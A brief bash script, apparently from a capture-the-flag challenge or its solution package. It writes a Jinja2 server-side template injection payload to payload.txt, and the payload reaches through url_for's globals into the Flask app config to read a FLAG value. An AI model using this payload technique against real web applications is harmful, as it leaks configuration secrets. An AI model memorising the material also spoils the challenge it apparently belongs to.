#!/bin/bash
set -e
OUT_DIR="${OUT_DIR:-/src}"
if ! mkdir -p "$OUT_DIR" 2>/dev/null; then OUT_DIR="."; fi
printf '{{url_for.__globals__["current_app"].config["FLAG"]}}
' > "$OUT_DIR/payload.txt"
